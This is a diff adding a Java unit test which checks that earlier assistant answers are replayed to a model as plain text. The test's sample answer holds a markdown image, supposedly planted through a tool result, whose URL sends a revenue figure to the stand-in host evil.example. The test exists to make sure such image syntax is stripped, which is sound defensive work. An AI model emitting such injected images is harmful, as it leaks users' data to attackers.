@@ -41,6 +41,24 @@ class HistoryTest {
     }
 
     @Test
+    @DisplayName("an earlier answer goes back as the panel showed it: an image some tool result talked the model "
+            + "into writing is not handed back to it as its own words; a closing turn's message counts as the answer")
+    void earlierAnswersAsShown() {
+        String injected = "Doanh thu ![x [y]](//evil.example/p.png?d=12500000) đây";
+        List<Turn> turns = new ArrayList<>(List.of(new Turn.Question("Q1", "ctx"), text(injected)));
+        turns.addAll(exchange(2).subList(0, 3));
+        turns.add(text("Trợ lý tạm thời không trả lời được, vui lòng thử lại sau ít phút"));
+        turns.add(new Turn.Question("now", "ctx"));
+
+        List<Turn> sent = History.forModel(turns, HistoryTest::text);
+
+        assertThat(((Turn.ModelTurn) sent.get(1)).text()).isEqualTo(AnswerText.plain(injected)).doesNotContain("![");
+        assertThat(((Turn.ModelTurn) sent.get(3)).text())
+                .isEqualTo("Trợ lý tạm thời không trả lời được, vui lòng thử lại sau ít phút");
+        assertThat(sent).hasSize(5);
+    }
+
+    @Test
     @DisplayName("only the last ten earlier questions are sent, and a long or missing answer is marked")
     void bounded() {
         List<Turn> turns = new ArrayList<>();
